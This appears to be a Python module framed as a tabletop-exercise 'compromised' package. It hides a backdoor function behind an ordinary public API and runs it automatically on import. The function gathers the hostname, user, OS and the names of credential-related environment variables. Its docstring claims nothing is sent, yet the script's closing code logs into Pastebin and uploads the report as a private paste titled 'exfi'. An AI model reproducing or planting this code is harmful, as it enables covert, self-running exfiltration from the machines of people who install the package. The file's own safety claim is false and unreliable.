# internal_utils.py — versão "comprometida"
import os
import socket
import platform
import requests

def ROODKCAB():
    """
    EM UM ATAQUE REAL: enviaria dados para C2 via HTTP/DNS.
    NA SIMULAÇÃO: coleta e EXIBE localmente (não envia nada).
    """
    # Coleta info do ambiente 
    recon_data = {
        "hostname": socket.gethostname(),
        "user": os.getenv("USER") or os.getenv("USERNAME"),
        "os": platform.system(),
        "sensitive_vars": [
            k for k in os.environ
            if any(w in k.upper() for w in ["KEY","TOKEN","SECRET","PASSWORD","AWS","AZURE","GCP", "DEV_TOKEN","TOKENS","CRYPTO_TOKEN", "PROCESSOR_ARCHITECTURE"])
        ]
    }

    try:
        import tkinter as tk
        from tkinter import messagebox
        root = tk.Tk()
        root.withdraw()
        report = "\n".join([f"{k}: {v}" for k, v in recon_data.items()])
        messagebox.showinfo(
            "🔴 Tabletop — Payload simulado",
            f" — Dados que foram exfiltrados:\n\n{report}\n\n"
            "Dados enviados ao C2."
        )
        root.destroy()
        return report
    except Exception:
        print("\n" + "="*50)
        print("[TABLETOP] Dados que teriam sido exfiltrados:")
        for k, v in recon_data.items():
            print(f"  {k}: {v}")
        print("="*50)

# Backdoor: executa na importação do módulo
ROODKCAB()

# API pública normal do pacote (não alterada — difícil de detectar)
def process_data(data: dict) -> dict:
    return {k: str(v).upper() for k, v in data.items()}
def get_version() -> str:
    return "2.3.1"

# ============================================================
# ✅ Login seguro na API do Pastebin
# ============================================================
def pastebin_login(api_dev_key: str, username: str, password: str) -> str:
    """
    Login no Pastebin. Retorna api_user_key.
    """
    url = "https://pastebin.com/api/api_login.php"

    payload = {
        "api_dev_key": api_dev_key,
        "api_user_name": username,
        "api_user_password": password
    }

    response = requests.post(url, data=payload)

    if response.status_code != 200:
        raise Exception(f"Erro HTTP ao fazer login: {response.status_code}")

    result = response.text

    if result.startswith("Bad API request"):
        raise Exception(f"Erro ao autenticar na API: {result}")

    return result  # api_user_key

# ============================================================
# ✅ Criar paste privado no Pastebin
# ============================================================
def create_private_paste(data: dict, api_dev_key: str, api_user_key: str, title: str = "exfi"):
    processed = process_data(data)

    paste_body = "\n".join(f"{k}: {v}" for k, v in processed.items())

    url = "https://pastebin.com/api/api_post.php"
    payload = {
        "api_dev_key": api_dev_key,
        "api_user_key": api_user_key,
        "api_option": "paste",
        "api_paste_private": "2",     # 2 = private
        "api_paste_name": title,
        "api_paste_code": paste_body,
        "api_paste_format": "text",
        "api_paste_expire_date": "N"  # Nunca expira
    }

    response = requests.post(url, data=payload)
    return response.text


api_dev_key = "<dev_key>"
username = "<username>"
password = "<password>"

try:
    api_user_key = pastebin_login(api_dev_key, username, password)
    print("✅ api_user_key obtida:", api_user_key)
except Exception as e:
    print("❌ Falha no login:", e)
    api_user_key = None

data = {"Report": ROODKCAB()}
result = create_private_paste(data, api_dev_key, api_user_key)
print("✅ URL do paste privado:", result)


# ============================================================